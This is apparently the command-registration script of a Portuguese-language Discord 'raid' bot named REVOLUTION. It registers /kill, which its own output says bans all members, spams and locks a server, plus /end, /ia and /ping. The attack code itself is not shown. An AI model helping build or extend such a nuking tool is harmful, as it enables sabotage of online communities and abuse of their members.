const { REST, Routes, SlashCommandBuilder } = require('discord.js');
require('dotenv').config();

const commands = [
  new SlashCommandBuilder()
    .setName('kill')
    .setDescription('🔥 ATAQUE REVOLUTION - BAN + SPAM + LOCK (DONO)'),

  new SlashCommandBuilder()
    .setName('end')
    .setDescription('🛑 PARA O ATAQUE REVOLUTION (DONO)'),

  new SlashCommandBuilder()
    .setName('ia')
    .setDescription('🤖 PERGUNTE ALGO PARA A IA REVOLUTION')
    .addStringOption(option =>
      option.setName('pergunta')
        .setDescription('Digite sua pergunta')
        .setRequired(true)
        .setMaxLength(1000)),

  new SlashCommandBuilder()
    .setName('ping')
    .setDescription('🏓 VERIFICAR LATÊNCIA DO BOT')
];

const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);

(async () => {
  try {
    console.log('🚀 REGISTRANDO COMANDOS REVOLUTION...');
    await rest.put(
      Routes.applicationCommands(process.env.CLIENT_ID),
      { body: commands.map(cmd => cmd.toJSON()) }
    );
    console.log('✅ COMANDOS REVOLUTION REGISTRADOS!');
    console.log('📱 /kill - Bane todos + Spam + Lock');
    console.log('📱 /end - Para ataque');
    console.log('📱 /ia pergunta: - IA Revolution');
    console.log('📱 /ping - Latência');
  } catch (error) {
    console.error('❌ ERRO:', error);
  }
})();
